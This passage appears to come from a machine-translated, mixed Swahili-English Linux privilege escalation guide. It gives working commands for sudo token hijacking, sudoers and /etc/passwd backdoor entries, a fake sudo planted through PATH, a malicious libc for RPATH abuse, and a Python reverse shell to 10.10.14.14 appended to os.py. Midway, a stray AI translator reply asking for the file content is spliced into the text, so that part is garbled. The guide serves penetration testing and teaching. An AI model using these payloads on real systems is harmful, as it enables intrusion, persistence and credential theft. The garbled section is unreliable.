If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini hapana password, unaweza kuongeza privileges kwa **kusubiri kwa ajili ya utekelezaji wa amri ya sudo kisha ku-hijack session token**.

Requirements to escalate privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" amekuwa **ametumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa default hiyo ndiyo duration ya sudo token inayoiruhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuweza ku-upload yake)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root na kupewa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Exploit ya tatu** (`exploit_v3.sh`) itaunda **sudoers file** ambayo inafanya **sudo tokens kuwa ya kudumu na inaruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini za kuandika** kwenye kabrasha au kwenye yoyote ya faili zilizotengenezwa ndani ya kabrasha, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku **unda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nywila kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Kama unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala ya binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huunganishwa kwenye mashine na hutumia `sudo`** ili kuongeza mamlaka na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **create a new sudo executable** ambayo itaendesha code yako kama root kisha amri ya mtumiaji. Kisha, **modify the $PATH** ya muktadha wa mtumiaji (kwa mfano kuongeza path mpya katika .bash_profile) ili wakati mtumiaji anapoendesha sudo, yako sudo executable itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili zingine ili kuongeza path mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

The file `/etc/ld.so.conf` indicates **wapi faili za usanidi zinazoliswa zinatoka**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. Faili hizi za usanidi **zinaonyesha folda nyingine** ambapo **maktaba** zitatafutwa. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/` itatumiwa na programu mahali hapa kama ilivyoainishwa katika variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities zinatoa **sehemu ndogo ya ruhusa za root zinazopatikana kwa mchakato**. Hii kwa ufanisi inavunja ruhusa za root **kuwa vitengo vidogo na vinavyotofautiana**. Kila kimoja cha vitengo hivi kinaweza kupewa mchakato kwa njia ya kujitegemea. Kwa njia hii seti nzima ya ruhusa inapunguzwa, ikipunguza hatari za matumizi mabaya.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Idhini za saraka

Katika saraka, the **bit for "execute"** inaashiria kwamba mtumiaji anayehusika anaweza "**cd**" kuingia kwenye folda.\
The **"read"** bit inaashiria mtumiaji anaweza **list** the **files**, na the **"write"** bit inaashiria mtumiaji anaweza **delete** na **create** faili mpya.

## ACLs

Access Control Lists (ACLs) ni tabaka la pili la ruhusa za hiari, linaloweza **kupindua ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaongeza udhibiti juu ya ufikiaji wa faili au saraka kwa kuruhusu au kukataza haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **undani kinahakikisha usimamizi sahihi zaidi wa ufikiaji**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" read na write permissions juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zilizo na ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### ACL backdoor iliyofichwa kwenye sudoers drop-ins

Usanidi mbaya wa kawaida ni faili inayomilikiwa na root ndani ya `/etc/sudoers.d/` yenye mode `440` ambayo bado inampa mtumiaji mwenye ruhusa ndogo uwezo wa kuandika kupitia ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ikiwa unaona kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza kanuni ya sudo licha ya mode bits zenye vizuizi:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Huu ni njia ya ACL persistence/privesc yenye athari kubwa kwa sababu ni rahisi kukosa katika mapitio yanayotegemea tu `ls -l`.

## Vikao vya shell vilivyofunguliwa

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session ya mtumiaji mwingine (**root**).\
Katika **matoleo mapya** utaweza tu **connect** kwa screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Unganisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Tatizo hili lilitokea kwenye **old tmux versions**. Sikuweza hijack tmux (v2.1) session iliyoundwa na root nikiwa mtumiaji asiye na ruhusa.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Ambatisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between Septemba 2006 na Mei 13, 2008 may be affected by this bug.\
Hitilafu hii inatokea wakati wa kuunda ssh key mpya katika OS hizo, kwani **tu 32,768 tofauti zilikuwa zimewezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **kwa kuwa na ssh public key unaweza kutafuta corresponding private key**. Unaweza kupata uwezekano zilizohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Vigezo vya kusanidi vinavyovutia

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### Mafaili ya udhibiti wa kuingia

Haya mafaili huathiri nani anaweza kuingia na jinsi:

- **`/etc/nologin`**: ikiwa ipo, inazuia non-root logins na inachapisha ujumbe wake.
- **`/etc/securetty`**: inazuia mahali ambapo root anaweza kuingia (TTY allowlist).
- **`/etc/motd`**: bango baada ya kuingia (inaweza leak environment au maintenance details).

### PermitRootLogin

Inaelezea kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : hakuna

### AuthorizedKeysFile

Inaelezea mafaili yanayoshikilia public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitatuzwa na home directory. **Unaweza kuelezea absolute paths** (kuanzia katika `/`) au **relative paths kutoka home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inaruhusu wewe **use your local SSH keys instead of leaving keys** (without passphrases!) zisiwe zimehifadhiwa kwenye server yako. Kwa hivyo, utaweza **jump** kupitia ssh **to a host** na kutoka huko **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Zingatia kwamba ikiwa `Host` ni `*` kila mara mtumiaji anapohamia kwenye mashine tofauti, mashine hiyo itaweza kufikia funguo (ambayo ni suala la usalama).

Faili `/etc/ssh_config` inaweza **kupindua** hizi **chaguzi** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataliwa** ssh-agent forwarding kwa kutumia keyword `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa utagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Zinazovutia

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripti zinazotekelezwa wakati mtumiaji anapoendesha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote yao unaweza escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Iwapo skripti ya profile isiyo ya kawaida itapatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Passwd/Shadow Files

Kutegemea OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na backup. Kwa hivyo inashauriwa **zipate zote** na **kagua kama unaweza kuzisoma** kuona **kama kuna hashes** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nywila kwa moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don’t have the file content. Please paste the contents of src/linux-hardening/privilege-escalation/README.md (or the parts you want translated). 

Also confirm:
- Do you want me to append a line/section that creates the user `hacker` and includes a generated password in the translated file? 
- Any requirements for the generated password (length, characters, pronounceable)?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa kutumia `hacker:hacker`

Mbali na hayo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\ ONYO: unaweza kuharibu usalama wa mashine kwa sasa.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina jipya `/etc/spwd.db`.

Unapaswa kukagua kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye **faili ya usanidi ya huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha server ya **tomcat** na unaweza **kubadilisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara ijayo tomcat itakapowashwa.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hauwezi kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika chache zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB mafayela
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Mafaili yanayojulikana yanayoweza kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **mafayela kadhaa yanayoweza kuwa na nywila**.\
**Chombo kingine kinachovutia** unachoweza kutumia kwa hilo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu ya chanzo huria inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logi

Ikiwa unaweza kusoma logi, unaweza kugundua **taarifa za kuvutia/za siri ndani yao**. Kadiri logi inavyoonekana ya ajabu, ndivyo itakavyokuwa ya kuvutia (labda).\
Pia, baadhi ya "**bad**" configured (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logi kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada sana.

### Faili za shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

You should also check for files containing the word "**password**" in its **name** or inside the **content**, and also check for IPs and emails inside logs, or hashes regexps.\
Sitaelezi hapa jinsi ya kufanya yote haya kwa undani lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

If you know from **wapi** python script itakuwa executed na unaweza **kuandika ndani** ya folda hiyo au unaweza **kuhariri python libraries**, unaweza modify the OS library na kuiweka backdoor (ikiwa unaweza kuandika mahali python script itaendeshwa, copy and paste the os.py library).

Ili **backdoor the library** ongeza mwishoni mwa os.py library mstari ufuatao (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Utumiaji wa udhaifu wa Logrotate

Udhaifu katika `logrotate` unawawezesha watumiaji wenye **write permissions** kwenye log file au saraka zake za juu kupata kwa uwezekano escalated privileges. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kudhibitiwa ili itekeleze files yoyote, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua permissions sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo log rotation inatumiwa.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` na toleo za zamani

Taarifa zaidi kuhusu udhaifu zinaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua unaweza kubadilisha logs, angalia nani anayesimamia logs hizo na angalia kama unaweza escalate privileges kwa kubadilisha logs kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` ni nyumbani kwa **skripti** za System V init (SysVinit), **mfumo wa jadi wa usimamizi wa huduma za Linux**. Inajumuisha skripti za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zilizopo katika `/etc/rc?.d/`. Njia mbadala katika mfumo wa Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **service management** uliotanguliwa na Ubuntu, unaotumia mafaili ya usanidi kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kuelekea Upstart, skripti za SysVinit bado zinatumiwa pamoja na usanidi wa Upstart kutokana na tabaka la ulinganifu ndani ya Upstart.

**systemd** inatokea kama jenereta ya kisasa ya initialization na service manager, ikitoa vipengele vya juu kama kuanzisha daemon kwa ombi, usimamizi wa automount, na snapshots za hali ya mfumo. Inaweka mafaili ndani ya `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.

## Mbinu nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks mara nyingi hu-hook syscall ili kufichua uwezo wa kernel wenye vibali kwa userspace manager. Udhaifu wa uthibitishaji wa manager (mfano, checks za signature zinazotegemea FD-order au mbinu duni za nywila) unaweza kumruhusu app ya ndani kuiga manager na kuinua vibali hadi root kwenye vifaa vilivyoshikwa tayari. Jifunze zaidi na maelezo ya exploitation hapa:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa path ya binary kutoka kwenye mistari ya amri za process na kuiendesha kwa kutumia -v chini ya muktadha wenye vibali. Mifumo isiyozuia (mfano, kutumia \S) inaweza kuendana na listeners zilizowekwa na mshambuliaji katika maeneo yanayoweza kuandikwa (mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone pattern jumla inayoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kinga za Usalama za Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
